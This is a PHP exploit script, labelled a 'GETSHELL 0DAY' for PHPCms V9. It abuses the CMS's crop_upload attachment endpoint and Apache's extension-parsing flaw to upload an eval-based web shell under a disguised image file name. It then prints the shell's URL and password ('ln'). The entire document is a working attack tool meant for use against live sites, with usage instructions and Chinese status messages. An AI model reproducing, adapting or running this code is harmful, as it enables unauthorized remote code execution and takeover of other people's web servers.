<?php

error_reporting(E_ERROR);

set_time_limit(0);

$pass="ln";

print_r('

+---------------------------------------------------------------------------+

PHPCms V9 GETSHELL 0DAY

code by L.N.

apache 适用(利用的apache的解析漏洞)

+---------------------------------------------------------------------------+

');

if ($argc < 2) {

print_r('

+---------------------------------------------------------------------------+

Usage: php '.$argv[0].' url path

Example:

1.php '.$argv[0].' lanu.sinaapp.com

2.php '.$argv[0].' lanu.sinaapp.com /phpcms

+---------------------------------------------------------------------------+

');

exit;

}

$url = $argv[1];

$path = $argv[2];

$phpshell = '<?php @eval($_POST[\''.$pass.'\']);?>';

$file = '1.thumb_.Php.JPG%20%20%20%20%20%20%20Php';

if($ret=Create_dir($url,$path))

{

//echo $ret;

$pattern = "|Server:[^,]+?|U";

preg_match_all($pattern, $ret, $matches);

if($matches[0][0])

{

if(strpos($matches[0][0],'Apache') == false)

{

echo "\n亲！此网站不是apache的网站。\n";exit;

}

}

$ret = GetShell($url,$phpshell,$path,$file);

$pattern = "|http:\/\/[^,]+?\.,?|U";

preg_match_all($pattern, $ret, $matches);

if($matches[0][0])

{

echo "\n".'密码为: '.$pass."\n";

echo "\r\nurl地址: ".$matches[0][0].'JPG%20%20%20%20%20%20%20Php'."\n";exit;



}

else

{

$pattern = "|\/uploadfile\/[^,]+?\.,?|U";

preg_match_all($pattern, $ret, $matches);

if($matches[0][0])



{

echo "\n".'密码为: '.$pass."\n";

echo "\r\nurl地址:".'http://'.$url.$path.$matches[0][0].'JPG%20%20%20%20%20%20%20Php'."\n";exit;

}

else

{

echo "\r\n没得到！\n";exit;

}

}

}

function GetShell($url,$shell,$path,$js)

{

    $content =$shell;

    $data = "POST ".$path."/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://".$url.$path."/uploadfile/".$js." HTTP/1.1\r\n";

    $data .= "Host: ".$url."\r\n";

    $data .= "User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n";

    $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";

    $data .= "Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n";

    $data .= "Connection: close\r\n";

    $data .= "Content-Length: ".strlen($content)."\r\n\r\n";

    $data .= $content."\r\n";

    $ock=fsockopen($url,80);

    if (!$ock)

{

        echo "\n"."此网站没有回应,检测url是否输入正确"."\n";exit;

    }

else

{

fwrite($ock,$data);

$resp = '';

while (!feof($ock))

{

$resp.=fread($ock, 1024);

}

return $resp;

}

}

function Create_dir($url,$path='')

{

    $content ='I love you';

    $data = "POST ".$path."/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://lanu.sinaapp.com/1.jpg HTTP/1.1\r\n";

    $data .= "Host: ".$url."\r\n";

    $data .= "User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n";

    $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";

    $data .= "Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n";

    $data .= "Connection: close\r\n";

    $data .= "Content-Length: ".strlen($content)."\r\n\r\n";

    $data .= $content."\r\n";

    $ock=fsockopen($url,80);

    if (!$ock)

{

        echo "\n"."此网站没有回应,检测url是否输入正确"."\n";exit;



    }

fwrite($ock,$data);

    $resp = '';

    while (!feof($ock))

{

        $resp.=fread($ock, 1024);

    }

return $resp;

}

?>